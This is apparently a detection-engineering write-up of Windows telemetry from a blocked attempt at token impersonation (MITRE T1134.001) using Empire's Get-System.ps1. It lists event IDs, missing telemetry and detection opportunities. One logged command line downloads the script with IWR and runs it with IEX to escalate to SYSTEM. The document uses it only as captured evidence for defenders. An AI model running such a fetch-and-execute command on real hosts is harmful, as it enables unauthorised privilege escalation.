# T1134.001-2: Token Impersonation/Theft — SeDebugPrivilege token duplication

## Technique Context

Token Impersonation/Theft (T1134.001) allows attackers to escalate privileges or move laterally by manipulating Windows access tokens. This technique involves duplicating or stealing existing tokens from other processes, particularly those running with elevated privileges like SYSTEM. The specific test execution here attempts "SeDebugPrivilege token duplication" — a method where an attacker with SeDebugPrivilege (typically administrators or SYSTEM accounts) can open handles to SYSTEM processes, extract their tokens, and impersonate those tokens to gain SYSTEM-level access.

Detection engineers focus on process access events targeting high-privilege processes, privilege escalation attempts, and PowerShell-based token manipulation. This technique is commonly used by post-exploitation frameworks like Empire, Metasploit, and Cobalt Strike, making it a critical detection target for SOC teams hunting advanced threats.

## What This Dataset Contains

This dataset captures a failed attempt to execute Empire's Get-System.ps1 token duplication technique. The execution was blocked by Windows Defender's AMSI (Anti-Malware Scan Interface) before the actual token manipulation could occur.

Key events include:
- **Security 4688**: PowerShell process creation with command line `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose}`
- **PowerShell 4103**: Invoke-WebRequest downloading the Empire Get-System.ps1 script
- **PowerShell 4100**: AMSI blocking with error "This script contains malicious content and has been blocked by your antivirus software"
- **PowerShell 4103**: Invoke-Expression failing due to AMSI intervention
- **Sysmon 22**: DNS query to `raw.githubusercontent.com` for the script download
- **Sysmon 1**: Process creation events for whoami.exe (0x4cc4) and the child PowerShell process (0x238)
- **Sysmon 10**: Process access events showing PowerShell accessing both whoami.exe (0x1FFFFF access) and another PowerShell process (0x1FFFFF access)
- **Security 4703**: Token rights adjustment showing privilege escalation activity with SeDebugPrivilege-related privileges enabled

## What This Dataset Does Not Contain

The dataset lacks the actual token duplication telemetry because Windows Defender's AMSI blocked the script execution before the technique could complete. Missing events include:
- No successful OpenProcessToken calls against SYSTEM processes
- No DuplicateToken API calls
- No SetThreadToken operations
- No successful privilege escalation evidence beyond the initial attempt
- No LSASS process access (the typical target for token theft)
- Limited Security audit events for successful token manipulation

The technique was intercepted at the PowerShell script loading stage, so the low-level Windows API calls that would demonstrate actual token theft never occurred.

## Assessment

This dataset provides moderate value for detection engineering, primarily demonstrating the pre-execution phase of token impersonation attempts. The telemetry is strongest for detecting the delivery mechanism (PowerShell downloading Empire scripts, AMSI blocking malicious content) rather than the token manipulation itself. 

The Security 4703 event showing token rights adjustment and the Sysmon 10 process access events provide some insight into privilege-related activity, but these occur during normal PowerShell operation rather than malicious token duplication. The dataset would be significantly stronger if it contained successful token duplication attempts showing OpenProcessToken, DuplicateToken, and SetThreadToken API calls against SYSTEM processes.

## Detection Opportunities Present in This Data

1. **Empire Framework Detection** - PowerShell downloading scripts from `raw.githubusercontent.com/BC-SECURITY/Empire/` repositories with specific commit hashes
2. **AMSI Blocking Events** - PowerShell error 4100 with "script contains malicious content" indicating AV/EDR intervention
3. **Suspicious PowerShell Command Lines** - Commands combining `IEX`, `IWR`, and privilege escalation keywords like "Get-System -Technique Token"
4. **Process Access with Full Rights** - Sysmon 10 events showing PowerShell accessing other processes with 0x1FFFFF (full access) permissions
5. **Token Rights Adjustment** - Security 4703 events showing privilege escalation-related rights being enabled in PowerShell processes
6. **DNS Queries for Malicious Repositories** - Sysmon 22 events for raw.githubusercontent.com, especially from PowerShell processes
7. **PowerShell Module Loading Patterns** - Specific sequence of System.Management.Automation.ni.dll and related .NET assemblies loading in suspicious PowerShell processes
